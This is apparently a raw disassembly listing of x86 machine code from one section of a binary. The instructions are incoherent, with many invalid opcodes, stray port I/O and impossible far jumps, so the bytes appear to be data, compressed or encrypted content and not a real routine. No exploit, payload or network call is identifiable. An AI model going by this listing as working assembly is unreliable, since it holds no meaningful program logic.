  4163d6:	dec    ebp
  4163d7:	push   edi
  4163d8:	jae    0x4163b4
  4163da:	dec    BYTE PTR [eax-0x6a]
  4163dd:	sar    BYTE PTR [edi+ebp*2+0x2],cl
  4163e1:	and    DWORD PTR [ecx+0x6d],edx
  4163e4:	xchg   ebx,eax
  4163e5:	inc    edx
  4163e6:	inc    ebx
  4163e7:	sbb    ah,dh
  4163e9:	scas   al,BYTE PTR es:[edi]
  4163ea:	fmul   QWORD PTR [ecx]
  4163ec:	xchg   esp,eax
  4163ed:	iretw  
  4163ef:	adc    eax,ebx
  4163f1:	fcomp  st(7)
  4163f3:	stos   DWORD PTR es:[edi],eax
  4163f4:	push   ds
  4163f5:	sub    DWORD PTR [eax+edx*4],ebp
  4163f8:	arpl   WORD PTR [ecx],di
  4163fa:	scas   al,BYTE PTR es:[edi]
  4163fb:	mov    edx,0x1bee4006
  416400:	push   es
  416401:	(bad)  
  416402:	ror    edx,0x2f
  416405:	jmp    0x4163f3
  416407:	add    edx,DWORD PTR [ebx+0x66]
  41640a:	sti    
  41640b:	mov    BYTE PTR [esi-0x18443c27],0x0
	...
  416472:	add    BYTE PTR [eax],al
  416474:	repz inc ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416481:	fldenv [ebx+0x62]
  416484:	pop    ecx
  416485:	jmp    0x416487
  416487:	add    BYTE PTR ds:0xf7000001,al
  41648d:	sub    BYTE PTR [edi+ebx*1+0x67cc8778],dl
  416494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416495:	scas   eax,DWORD PTR es:[edi]
  416496:	mov    ecx,0xd8aeb9ea
  41649b:	or     BYTE PTR [ebx-0x4037ed0a],bh
  4164a1:	adc    DWORD PTR [eax+0x6b],ebx
  4164a4:	hlt    
  4164a5:	mov    cl,0x9e
  4164a7:	imul   edi,ebx,0x8d815806
  4164ad:	and    edx,DWORD PTR [eax+edi*1+0x4c]
  4164b1:	pop    ecx
  4164b2:	mov    bl,0x1c
  4164b4:	pop    esp
  4164b5:	push   ss
  4164b6:	scas   al,BYTE PTR es:[edi]
  4164b7:	mov    ?,WORD PTR [esi-0x5d]
  4164ba:	dec    esi
  4164bb:	sbb    al,0x31
  4164bd:	adc    eax,esp
  4164bf:	sub    eax,0x839e886c
  4164c4:	ins    BYTE PTR es:[edi],dx
  4164c5:	cmc    
  4164c6:	mov    ecx,ss
  4164c8:	(bad)  
  4164c9:	in     eax,dx
  4164ca:	in     al,0xf8
  4164cc:	(bad)  
  4164cd:	sti    
  4164ce:	outs   dx,BYTE PTR ds:[esi]
  4164cf:	ror    DWORD PTR [ebx],0xa8
  4164d2:	mov    dl,0xd5
  4164d4:	test   BYTE PTR [edx],bl
  4164d6:	inc    DWORD PTR [ecx-0x6d]
  4164d9:	fisub  WORD PTR [edx+0x3b]
  4164dc:	stos   DWORD PTR es:[edi],eax
  4164dd:	push   ecx
  4164de:	fdiv   QWORD PTR [ebx+0x1c715fff]
  4164e4:	xor    bl,dl
  4164e6:	test   BYTE PTR ds:0xddd9f022,al
  4164ec:	or     edi,edx
  4164ee:	sub    al,0xe4
  4164f0:	or     dl,BYTE PTR [eax+0x28]
  4164f3:	pushf  
  4164f4:	xchg   esi,eax
  4164f5:	retf   0x4dea
  4164f8:	pop    ds
  4164f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164fa:	test   DWORD PTR [ebx+edx*1],edi
  4164fd:	lock in al,dx
  4164ff:	iret   
  416500:	lock fsubr QWORD PTR [esi]
  416503:	aad    0x34
  416505:	mov    ecx,DWORD PTR [edx-0x6b]
  416508:	std    
  416509:	xchg   esi,eax
  41650a:	sub    al,BYTE PTR [esi+0x443c256e]
  416510:	in     eax,dx
  416511:	es jnp 0x4164b2
  416514:	jb     0x4164f5
  416516:	in     eax,0x4c
  416518:	scas   al,BYTE PTR es:[edi]
  416519:	mov    eax,ds:0x9ed06e52
  41651e:	or     dh,bl
  416520:	mov    eax,0x2996b6e6
  416525:	pop    eax
  416526:	inc    esi
  416527:	in     eax,0x59
  416529:	add    DWORD PTR ss:[edx-0x3da5dd0b],0x6e6707db
  416534:	rcl    esp,0xb6
  416537:	bound  edx,QWORD PTR [ecx]
  416539:	mov    dl,ah
  41653b:	pushf  
  41653c:	dec    eax
  41653d:	pop    edi
  41653e:	addr16 test ah,al
  416541:	pop    ebp
  416542:	mov    esi,0xac32d4d8
  416547:	(bad)  
  416548:	mov    esp,0x91125dfd
  41654d:	xor    dl,cl
  41654f:	sar    bl,0xf
  416552:	push   cx
  416554:	addr16 enter 0xba00,0x65
  416559:	sbb    al,BYTE PTR [ebp-0x1b]
  41655c:	mov    ch,0x58
  41655e:	push   ds
  41655f:	mov    ds:0xd893993c,eax
  416564:	out    dx,eax
  416565:	pushf  
  416566:	mov    cl,0xf2
  416568:	and    ch,BYTE PTR ds:0xe8149aca
  41656e:	test   eax,0x56dfa6f0
  416573:	popa   
  416574:	mov    edx,0xd7d43ae5
  416579:	fcom   st(1)
  41657b:	push   esi
  41657c:	shl    BYTE PTR [edi+0x3d],cl
  41657f:	sub    al,0x9c
  416581:	dec    esi
  416582:	call   0x113ec86f
  416587:	fdiv   QWORD PTR [ebp-0xd]
  41658a:	sti    
  41658b:	jb     0x416586
  41658d:	jbe    0x41659b
  41658f:	lea    edi,[eax+eax*1+0x0]
	...
  4165f2:	add    BYTE PTR [eax],al
  4165f4:	and    eax,0xfff32bd8
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi+0x374fbcac]
  416601:	fs mov ch,0x1c
  416604:	pop    esi
  416605:	in     al,dx
  416606:	add    BYTE PTR [eax],al
  416608:	add    eax,0x14000001
  41660d:	imul   eax,esi,0x7338dc41
  416613:	ins    BYTE PTR es:[edi],dx
  416614:	mov    ah,0x58
  416616:	dec    ebx
  416617:	mov    ds:0x22ad1f0f,eax
  41661c:	sahf   
  41661d:	in     al,0x3b
  41661f:	ins    DWORD PTR es:[edi],dx
  416620:	stos   BYTE PTR es:[edi],al
  416621:	mov    WORD PTR [eax],ss
  416623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416624:	fdiv   QWORD PTR [edi-0x3cb68a22]
  41662a:	mov    eax,0xc44e8fa
  41662f:	inc    ecx
  416630:	jmp    0x18c5c86e
  416635:	mov    gs,WORD PTR [ebx-0x2bd95b31]
  41663b:	iret   
  41663c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41663d:	arpl   dx,si
  41663f:	std    
  416640:	std    
  416641:	push   ebp
  416642:	enter  0x576c,0x17
  416646:	ins    DWORD PTR es:[edi],dx
  416647:	xchg   edx,eax
  416648:	(bad)  
  416649:	out    dx,eax
  41664a:	cmp    edx,DWORD PTR [esi+ebx*4-0x51]
  41664e:	inc    ebx
  41664f:	mov    ebp,DWORD PTR [edx]
  416651:	hlt    
  416652:	inc    edi
  416653:	sub    esi,0xffffffab
  416656:	mov    ebp,0x2073e91f
  41665b:	stos   DWORD PTR es:[edi],eax
  41665c:	mov    ah,0xed
  41665e:	or     BYTE PTR [ebx+0x6b],al
  416661:	stc    
  416662:	out    0xe5,eax
  416664:	pop    ebx
  416665:	call   0xd9ce:0x730d0346
  41666c:	sbb    BYTE PTR [ebp+eiz*8-0x584e1532],ah
  416673:	outs   dx,DWORD PTR ds:[esi]
  416674:	cld    
  416675:	into   
  416676:	mov    cl,0xdd
  416678:	mov    cl,BYTE PTR [ecx]
  41667a:	adc    esp,DWORD PTR [ebp-0x5c]
  41667d:	lea    esi,[edi]
  41667f:	pop    ss
  416680:	rol    DWORD PTR [edi+0x69151ced],0x71
  416687:	std    
  416688:	inc    eax
  416689:	inc    ebx
  41668a:	add    DWORD PTR [ecx],eax
  41668c:	(bad)  
  41668d:	imul   esi,DWORD PTR [esi],0xa86c5f5f
  416693:	xor    al,ch
  416695:	call   0x1dd3:0xd83661e8
  41669c:	(bad)  
  41669d:	ins    DWORD PTR es:[edi],dx
  41669e:	aaa    
  41669f:	mov    ecx,0x1b332cb8
  4166a4:	lea    esi,[ecx+eiz*2-0x7e]
  4166a8:	dec    ebp
  4166a9:	jmp    0x9829b3c7
  4166ae:	fs (bad) 
  4166b0:	icebp  
  4166b1:	dec    esi
  4166b2:	fs inc eax
  4166b4:	mov    ah,0x7d
  4166b6:	fmul   st,st(2)
  4166b8:	loop   0x416647
  4166ba:	inc    ebp
  4166bb:	outs   dx,BYTE PTR ds:[esi]
  4166bc:	(bad)  
  4166bd:	sbb    ebx,esi
  4166bf:	leave  
  4166c0:	push   edi
  4166c1:	stc    
  4166c2:	scas   al,BYTE PTR es:[edi]
  4166c3:	pop    ds
  4166c4:	aaa    
  4166c5:	jmp    0x416729
  4166c7:	pop    edx
  4166c8:	adc    ch,ch
  4166ca:	inc    edx
  4166cb:	jecxz  0x416688
  4166cd:	jle    0x416706
  4166cf:	lock dec ebx
  4166d1:	inc    ch
  4166d3:	inc    ebp
  4166d4:	jmp    0x3abf:0x881d264b
  4166db:	(bad)  
  4166dc:	repz jl 0x4166ec
  4166df:	out    dx,al
  4166e0:	aad    0x39
  4166e2:	mov    eax,0x9abd9df2
  4166e7:	xchg   ebp,eax
  4166e8:	ja     0x41668b
  4166ea:	push   ecx
  4166eb:	xor    BYTE PTR [ecx-0x1a7aa232],ah
  4166f1:	daa    
  4166f2:	sti    
  4166f3:	popf   
  4166f4:	add    BYTE PTR [eax-0x63],bh
  4166f7:	repnz or cl,cl
  4166fa:	inc    ebx
  4166fb:	out    dx,al
  4166fc:	mov    ecx,0xe480145a
  416701:	popa   
  416702:	in     al,dx
  416703:	dec    dx
  416705:	jp     0x41675f
  416707:	inc    ebp
  416708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416709:	push   0x3b3dd48c
  41670e:	inc    esi
  41670f:	(bad)
	...
  416773:	add    ah,al
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	scas   al,BYTE PTR es:[edi]
  416781:	lahf   
  416782:	cmp    DWORD PTR [ecx],esi
  416784:	arpl   bp,bp
  416786:	add    BYTE PTR [eax],al
  416788:	add    eax,0x22000001
  41678d:	cwde   
  41678e:	retf   0x860d
  416791:	xor    DWORD PTR [esi+ebp*2],esp
  416794:	jle    0x4167a6
  416796:	dec    ebx
  416797:	inc    ecx
  416798:	and    al,0x2
  41679a:	jo     0x4167d6
  41679c:	fcomp  QWORD PTR [edx+0x21]
  41679f:	dec    esi
  4167a0:	dec    eax
  4167a1:	inc    edi
  4167a2:	adc    al,0xab
  4167a4:	adc    cl,BYTE PTR [ecx]
  4167a6:	mov    cl,0x91
  4167a8:	lea    eax,[edi]
  4167aa:	outs   dx,DWORD PTR ds:[esi]
  4167ab:	(bad)  
  4167ac:	sub    esi,ebx
  4167ae:	rol    DWORD PTR ds:0x243599bc,0x39
  4167b5:	mov    WORD PTR [ecx],gs
  4167b7:	std    
  4167b8:	xor    DWORD PTR [ebx+0x57aebe5],eax
  4167be:	aam    0x78
  4167c0:	fisub  DWORD PTR [eax+0x46d55e21]
  4167c6:	add    eax,0x39257b0a
  4167cb:	adc    al,0xa8
  4167cd:	push   edi
  4167ce:	(bad)  
  4167d0:	cli    
  4167d1:	inc    edx
  4167d2:	aas    
  4167d3:	ror    DWORD PTR [esi+ebx*4],1
  4167d6:	push   es
  4167d7:	in     al,dx
  4167d8:	stos   BYTE PTR es:[edi],al
  4167d9:	mov    esi,0xd2d3ffc1
  4167de:	adc    al,0x1e
  4167e0:	jns    0x416763
  4167e2:	lock jno 0x416835
  4167e5:	xchg   ecx,eax
  4167e6:	xor    eax,0x4d5fe9ec
  4167eb:	retf   
  4167ec:	mov    eax,ds:0x59ae5b41
  4167f1:	and    eax,0x34751b68
  4167f6:	cdq    
  4167f7:	call   0xc522:0x603a8cc7
  4167fe:	ret    
  4167ff:	cmp    DWORD PTR [edi-0x1f],eax
  416802:	xlat   BYTE PTR ds:[ebx]
  416803:	mov    ss,WORD PTR [edx]
  416805:	adc    al,0x1a
  416807:	repnz popa 
  416809:	inc    esi
  41680a:	xor    ah,ch
  41680c:	xchg   DWORD PTR [edi],ebx
  41680e:	mov    ah,0x9f
  416810:	or     BYTE PTR [esi-0x52],ah
  416813:	daa    
  416814:	(bad)  
  416815:	enter  0xeef0,0x39
  416819:	jnp    0x416855
  41681b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41681c:	mov    eax,ds:0xa0027924
  416821:	jecxz  0x416835
  416823:	add    al,0x84
  416825:	and    bh,BYTE PTR [edx-0x62]
  416828:	cmp    eax,0x23d23f2c
  41682d:	ds addr16 rcr ecx,1
  416831:	mov    esp,0x1c0a190a
  416836:	pop    ebx
  416837:	jle    0x4168b8
  416839:	sub    al,0x78
  41683b:	sub    al,0x26
  41683d:	xor    BYTE PTR [edx+0x5b],bh
  416840:	lods   eax,DWORD PTR ds:[esi]
  416841:	inc    ebp
  416842:	loope  0x416839
  416844:	push   ecx
  416845:	lods   eax,DWORD PTR ds:[esi]
  416846:	loop   0x416853
  416848:	mov    eax,ds:0x2a90268d
  41684d:	push   edi
  41684e:	xor    BYTE PTR [ebx+0x43],0x46
  416852:	and    bh,BYTE PTR [edx]
  416854:	mov    ebx,0x8eaa0753
  416859:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41685b:	ja     0x4168c1
  41685d:	std    
  41685e:	outs   dx,DWORD PTR ds:[esi]
  41685f:	pop    es
  416860:	adc    edx,DWORD PTR [edi]
  416862:	xor    ah,BYTE PTR [edx-0x2c]
  416865:	retf   
  416866:	xor    BYTE PTR [ebx],0x9a
  416869:	dec    ecx
  41686a:	dec    ecx
  41686b:	daa    
  41686c:	mov    bl,0xfe
  41686e:	pop    eax
  41686f:	(bad)  
  416871:	cmp    edi,edx
  416873:	mov    edx,0x246c983f
  416878:	in     al,0x46
  41687a:	xchg   edx,eax
  41687b:	les    ecx,FWORD PTR [ecx]
  41687d:	add    ebx,esp
  41687f:	sub    ch,ah
  416881:	jl     0x416848
  416883:	xor    DWORD PTR [ebx+0x53],edx
  416886:	xor    dl,dh
  416888:	aas    
  416889:	shl    DWORD PTR [edx+0x0],cl
  41688c:	leave  
  41688d:	retf   
  41688e:	jmp    0x4168a1
  416890:	sbb    al,BYTE PTR [eax]
	...
  4168f2:	add    BYTE PTR [eax],al
  4168f4:	shr    DWORD PTR [edi-0x4810cfa],1
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x75664210
  416904:	push   0x50000ee
  416909:	add    DWORD PTR [eax],eax
  41690b:	add    BYTE PTR [edx+eax*2+0xff67baf],dl
  416912:	xor    eax,0x764329e0
  416917:	out    dx,al
  416918:	dec    esi
  416919:	imul   ebx,ecx,0x4e
  41691c:	sbb    ch,ah
  41691e:	jns    0x41694a
  416920:	sub    eax,0xecbd5751
  416925:	adc    BYTE PTR [esi+0x5460cd01],ah
  41692b:	xchg   DWORD PTR [esi+0x3f],ebp
  41692e:	pop    ecx
  41692f:	ror    BYTE PTR [ecx],0xc2
  416932:	add    eax,0x918c1642
  416937:	pop    ebx
  416938:	in     eax,0x35
  41693a:	xor    eax,edi
  41693c:	inc    ebp
  41693d:	or     eax,0x1a3d4b69
  416942:	push   ebx
  416943:	sbb    DWORD PTR [esi+ebp*4+0x3aaf7bc6],esp
  41694a:	ss pop ebp
  41694c:	inc    eax
  41694d:	pop    edi
  41694e:	out    dx,eax
  41694f:	sbb    ebp,0x401f40eb
  416955:	mov    edi,0x8e78094d
  41695a:	(bad)  
  41695b:	into   
  41695c:	add    DWORD PTR [edx],eax
  41695e:	mov    edx,0x4156fcb2
  416963:	ins    BYTE PTR es:[edi],dx
  416964:	fmul   DWORD PTR [ebp+0x55a4bf0d]
  41696a:	push   ss
  41696b:	pop    ebx
  41696c:	cmp    al,0x86
  41696e:	mov    ebx,0x339b29af
  416973:	mov    dl,0xd0
  416975:	mov    esi,DWORD PTR [ecx+ebp*1-0x28146d01]
  41697c:	sbb    al,0xc0
  41697e:	pusha  
  41697f:	sbb    al,0xaf
  416981:	inc    ebp
  416982:	aaa    
  416983:	in     eax,dx
  416984:	mov    edx,0x28575382
  416989:	loope  0x41697d
  41698b:	push   0xcd2ad26f
  416990:	div    BYTE PTR [edi+0x17]
  416993:	adc    DWORD PTR [ebx],ebp
  416995:	mov    eax,ds:0xc3b8d0fe
  41699a:	scas   al,BYTE PTR es:[edi]
  41699b:	sar    DWORD PTR [ebx+0x7aa6612b],0xe
  4169a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169a3:	sahf   
  4169a4:	imul   DWORD PTR [edx-0x47]
  4169a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169a8:	lds    ebp,FWORD PTR gs:[eax]
  4169ab:	mov    BYTE PTR [ebx+esi*1-0x56],dh
  4169af:	adc    eax,0xd654e655
  4169b4:	push   0x5bf0681b
  4169b9:	lea    esp,[ecx]
  4169bb:	mov    WORD PTR [esi-0x219acb9c],ss
  4169c1:	sbb    eax,0x223ab838
  4169c6:	cmp    esp,edi
  4169c8:	stc    
  4169c9:	pushf  
  4169ca:	sbb    DWORD PTR [ecx+0x44c99350],edi
  4169d0:	mov    bl,0x66
  4169d2:	push   0xffffffcb
  4169d4:	sbb    edx,ecx
  4169d6:	sbb    edi,DWORD PTR [esi]
  4169d8:	leave  
  4169d9:	sahf   
  4169da:	sub    al,dl
  4169dc:	xchg   edi,eax
  4169dd:	dec    esp
  4169de:	jmp    0x29d9:0x5027986a
  4169e5:	mov    al,0x62
  4169e7:	jmp    0x416a48
  4169e9:	in     al,dx
  4169ea:	and    DWORD PTR [edx+ebx*4],ebp
  4169ed:	sti    
  4169ee:	imul   edx,DWORD PTR [ebp-0x24],0x841d726e
  4169f5:	mov    bh,0x85
  4169f7:	jp     0x4169cc
  4169f9:	xchg   ecx,eax
  4169fa:	jl     0x4169be
  4169fc:	je     0x416990
  4169fe:	push   cs
  4169ff:	rcl    DWORD PTR [eax-0x20],cl
  416a02:	test   DWORD PTR [edi+esi*2+0xc07057],ebx
  416a09:	sub    eax,0xaf4c4204
  416a0e:	rcl    edi,cl
  416a10:	xor    DWORD PTR [eax],eax
	...
  416a72:	add    BYTE PTR [eax],al
  416a74:	retf   
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0xe65b0ba3
  416a82:	enter  0x6d1c,0xef
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    eax,0x8c000001
  416a8d:	frstor ss:[edx+0x44573614]
  416a94:	cmp    ch,cl
  416a96:	jl     0x416aca
  416a98:	aad    0x35
  416a9a:	sbb    eax,0x53c239ce
  416a9f:	and    al,0x86
  416aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416aa2:	adc    eax,0x9c2b9ca9
  416aa7:	rcr    cl,0xee
  416aaa:	inc    esi
  416aab:	icebp  
  416aac:	add    eax,0xb476eb5a
  416ab1:	mov    esp,esp
  416ab3:	xor    al,0x94
  416ab5:	adc    BYTE PTR [esi-0x35842e99],dh
  416abb:	fdivr  QWORD PTR [edi-0xcd017e]
  416ac1:	cdq    
  416ac2:	sbb    eax,0xf179ff9d
  416ac7:	sbb    BYTE PTR [esi],ah
  416ac9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416aca:	push   edi
  416acb:	fs cld 
  416acd:	arpl   WORD PTR [edx],bx
  416acf:	or     DWORD PTR [ebx],esi
  416ad1:	ds fs jne 0x416a75
  416ad5:	mov    al,0x3d
  416ad7:	ret    
  416ad8:	popw   ds
  416ada:	lea    esp,[edi-0x4f537d57]
  416ae0:	or     DWORD PTR [edx+ecx*8],ebx
  416ae3:	ficom  DWORD PTR [edx+0x18]
  416ae6:	or     esi,eax
  416ae8:	mov    esp,0xc6406b8f
  416aed:	mov    bh,0x35
  416aef:	dec    ecx
  416af0:	ss scas al,BYTE PTR es:[edi]
  416af2:	fld    st(6)
  416af4:	vaddsubpd ymm0,ymm1,YMMWORD PTR [esp+ebp*4]
  416af9:	scas   al,BYTE PTR es:[edi]
  416afa:	mov    dl,0xad
  416afc:	mov    ebp,0x393defb
  416b01:	fild   WORD PTR [esi+esi*8-0x3d]
  416b05:	call   DWORD PTR [edx]
  416b07:	into   
  416b08:	mov    eax,0x125c765b
  416b0d:	pop    ebx
  416b0e:	mov    eax,ebx
  416b10:	repz adc cl,BYTE PTR [edx-0x3b050e8b]
  416b17:	push   esi
  416b18:	sub    dl,BYTE PTR [ebp+ebp*4+0x3c]
  416b1c:	out    dx,al
  416b1d:	mov    fs,WORD PTR [edx+0x3b4a254b]
  416b23:	pop    esi
  416b24:	loopne 0x416b67
  416b26:	stos   DWORD PTR es:[edi],eax
  416b27:	cmp    eax,0xd486ecfa
  416b2c:	sub    ah,BYTE PTR [edx+ecx*2]
  416b2f:	retf   
  416b30:	in     al,dx
  416b31:	cmp    ecx,DWORD PTR [ecx+0x500df9fb]
  416b37:	fwait
  416b38:	add    bh,BYTE PTR gs:[ebx]
  416b3b:	cs popf 
  416b3d:	in     eax,dx
  416b3e:	sbb    eax,0x57598bfc
  416b43:	pop    edx
  416b44:	sub    dl,BYTE PTR [edx-0x7a]
  416b47:	aaa    
  416b48:	push   eax
  416b49:	jmp    0x55a87ff8
  416b4e:	lock mov ebx,0x82299c08
  416b54:	xor    BYTE PTR [edi-0x5c],dl
  416b57:	(bad)  
  416b58:	retf   0xa32a
  416b5b:	outs   dx,DWORD PTR ds:[esi]
  416b5c:	cli    
  416b5d:	rol    ah,1
  416b5f:	std    
  416b60:	popf   
  416b61:	add    BYTE PTR [edx-0x11bec88c],dl
  416b67:	inc    ecx
  416b68:	sbb    BYTE PTR [edi],0xcf
  416b6b:	lock pop ss
  416b6d:	daa    
  416b6e:	jecxz  0x416bef
  416b70:	jnp    0x416b7c
  416b72:	out    dx,eax
  416b73:	jae    0x416b32
  416b75:	sbb    DWORD PTR [edi],ecx
  416b77:	jp     0x416aff
  416b79:	repz dec ebp
  416b7b:	pop    esp
  416b7c:	pop    ebp
  416b7d:	das    
  416b7e:	idiv   DWORD PTR [ebx+0x66]
  416b81:	mov    eax,ds:0xcf5c9fb1
  416b86:	ja     0x416bbf
  416b88:	sub    cl,dl
  416b8a:	adc    cl,BYTE PTR [edi]
  416b8c:	sbb    al,0x97
  416b8e:	dec    esi
  416b8f:	into   
	...
  416bf4:	jecxz  0x416c5b
  416bf6:	push   cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x955b70a9
  416c01:	sbb    bh,BYTE PTR [edi+0x74]
  416c04:	jb     0x416bf6
  416c06:	add    BYTE PTR [eax],al
  416c08:	add    eax,0x8b000001
  416c0d:	test   eax,0xc278a11e
  416c12:	das    
  416c13:	lahf   
  416c14:	fcmovb st,st(2)
  416c16:	dec    ecx
  416c17:	mov    fs,edx
  416c19:	stos   BYTE PTR es:[edi],al
  416c1a:	iret   
  416c1b:	loopne 0x416c9c
  416c1d:	(bad)  
  416c1e:	mov    al,ds:0xe03ec501
  416c23:	sub    BYTE PTR [edi],cl
  416c25:	sub    eax,0x43d40fbd
  416c2a:	jmp    0x9158:0x5bd628c8
  416c31:	leave  
  416c32:	dec    ebx
  416c33:	(bad)  
  416c34:	add    DWORD PTR [edx],ecx
  416c36:	push   edi
  416c37:	mov    dl,0xf8
  416c39:	sub    BYTE PTR [edx],ch
  416c3b:	imul   ecx,DWORD PTR [edi],0x6d
  416c3e:	test   al,0x38
  416c40:	sub    BYTE PTR [ecx],0xf0
  416c43:	lahf   
  416c44:	jno    0x416bdc
  416c46:	dec    edx
  416c47:	mov    ebp,DWORD PTR [eax-0x1a1452f9]
  416c4d:	adc    eax,0x3ecded9a
  416c52:	mov    fs,WORD PTR [ebp-0x1beac887]
  416c58:	sub    DWORD PTR [ecx+0x1e],edx
  416c5b:	adc    ah,bh
  416c5d:	mov    esp,0xb1bfdb5b
  416c62:	jmp    0x2ad7:0xf9a1f945
  416c69:	adc    esi,DWORD PTR [edx-0x2f]
  416c6c:	cmp    BYTE PTR [edx+ecx*4+0x2c],dl
  416c70:	stos   DWORD PTR es:[edi],eax
  416c71:	call   0x1ac:0x69c31071
  416c78:	addr16 push esp
  416c7a:	nop
  416c7b:	es xchg edi,eax
  416c7d:	dec    ebx
  416c7e:	jmp    0x3b46:0xf01ac561
  416c85:	mov    ebp,0x469fbb98
  416c8a:	inc    eax
  416c8b:	loop   0x416ce5
  416c8d:	sar    DWORD PTR [edx-0x65],1
  416c90:	push   ebp
  416c91:	aas    
  416c92:	inc    edi
  416c93:	inc    esp
  416c94:	cmp    dh,bh
  416c96:	es or  ebp,esi
  416c99:	jecxz  0x416c8f
  416c9b:	out    dx,eax
  416c9c:	sub    ah,0x5f
  416c9f:	push   0xffffffd9
  416ca1:	xlat   BYTE PTR ds:[ebx]
  416ca2:	sub    esp,DWORD PTR [edi-0x7b]
  416ca5:	push   cs
  416ca6:	cld    
  416ca7:	outs   dx,DWORD PTR ds:[esi]
  416ca8:	inc    ecx
  416ca9:	xor    al,0x38
  416cab:	test   al,0xc
  416cad:	mov    al,0xa5
  416caf:	dec    esi
  416cb0:	cdq    
  416cb1:	pop    ebx
  416cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cb4:	scas   al,BYTE PTR es:[edi]
  416cb5:	fstp   DWORD PTR [ebp+0x34]
  416cb8:	pop    eax
  416cb9:	mov    ebp,0xf27bf559
  416cbe:	in     eax,dx
  416cbf:	adc    BYTE PTR [esp+edi*8-0x76],0xec
  416cc4:	stos   BYTE PTR es:[edi],al
  416cc5:	rcl    BYTE PTR [ebp-0x2b],cl
  416cc8:	(bad)  
  416cc9:	mov    eax,0xfedb994e
  416cce:	and    eax,0xd1a3eba2
  416cd3:	push   esi
  416cd4:	inc    eax
  416cd5:	or     DWORD PTR [ecx],edi
  416cd7:	loope  0x416d4c
  416cd9:	popa   
  416cda:	mov    ebp,0x1a915aa1
  416cdf:	aaa    
  416ce0:	shl    DWORD PTR [edx-0x32fed424],1
  416ce6:	pop    edi
  416ce7:	jno    0x416d40
  416ce9:	mov    dh,BYTE PTR [esi+eiz*2]
  416cec:	sub    eax,0x189d721a
  416cf1:	leave  
  416cf2:	aas    
  416cf3:	stos   DWORD PTR es:[edi],eax
  416cf4:	jb     0x416d1c
  416cf6:	mov    edx,0xcbb9e1b3
  416cfb:	mov    ebx,0xd9bc472b
  416d00:	rcr    BYTE PTR [esi+ebx*2+0x4d],cl
  416d04:	pop    ebx
  416d05:	ret    0x995e
  416d08:	das    
  416d09:	(bad)  
  416d0a:	aam    0x9d
  416d0c:	aad    0x46
  416d0e:	push   ebx
  416d0f:	mov    dl,0x18
	...
  416d71:	add    BYTE PTR [eax],al
  416d73:	add    BYTE PTR [ecx],ah
  416d75:	xchg   ebx,eax
  416d76:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	jno    0x416d95
  416d82:	mov    ah,0x16
  416d84:	ja     0x416d77
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    eax,0x1d000001
  416d8d:	mov    ebp,0x42814a1
  416d92:	addr16 cdq 
  416d94:	cli    
  416d95:	shl    dh,cl
  416d97:	sbb    eax,0x149aec14
  416d9c:	jl     0x416d45
  416d9e:	mov    ah,0x5d
  416da0:	sbb    DWORD PTR [ebx-0x7e],0xdd80d72d
  416da7:	in     al,0x4a
  416da9:	arpl   WORD PTR [esi-0x32],sp
  416dac:	mov    esp,0xae4432e7
  416db1:	sbb    BYTE PTR [edx+0x49],0x43
  416db5:	sub    ch,bh
  416db7:	pop    eax
  416db8:	retf   0x2dd6
  416dbb:	mov    ch,0xa0
  416dbd:	mov    al,ds:0x5a96fa1c
  416dc2:	ins    DWORD PTR es:[edi],dx
  416dc3:	rcr    DWORD PTR [edi],cl
  416dc5:	add    ebx,DWORD PTR [esi-0x48a9ef7a]
  416dcb:	sub    al,0x1b
  416dcd:	mov    ecx,0x1dff6cd9
  416dd2:	mov    edx,edx
  416dd4:	lock xchg ebp,eax
  416dd6:	xor    BYTE PTR [edi],dh
  416dd8:	dec    edi
  416dd9:	ror    BYTE PTR [eax],1
  416ddb:	mov    cl,0xb9
  416ddd:	xor    cl,0xf1
  416de0:	dec    ebx
  416de1:	or     cl,ah
  416de3:	sub    ecx,DWORD PTR [ebp-0x4d452374]
  416de9:	mov    al,ds:0x4526eb3c
  416dee:	xor    eax,0x58840074
  416df3:	jbe    0x416da8
  416df5:	fwait
  416df6:	mov    dh,0xec
  416df8:	cmp    eax,DWORD PTR [eax+eax*8]
  416dfb:	or     DWORD PTR [eax],esp
  416dfd:	mov    ebp,0x36fa0374
  416e02:	repz (bad) 
  416e04:	cmp    BYTE PTR [edi],dh
  416e06:	sbb    eax,0x76255ca6
  416e0b:	xchg   ebx,eax
  416e0c:	clc    
  416e0d:	sub    al,0xf
  416e0f:	aas    
  416e10:	fucomi st,st(3)
  416e12:	loope  0x416dd0
  416e14:	(bad)  
  416e15:	je     0x416e65
  416e17:	ins    DWORD PTR es:[edi],dx
  416e18:	cdq    
  416e19:	dec    ebp
  416e1a:	lods   eax,DWORD PTR ds:[esi]
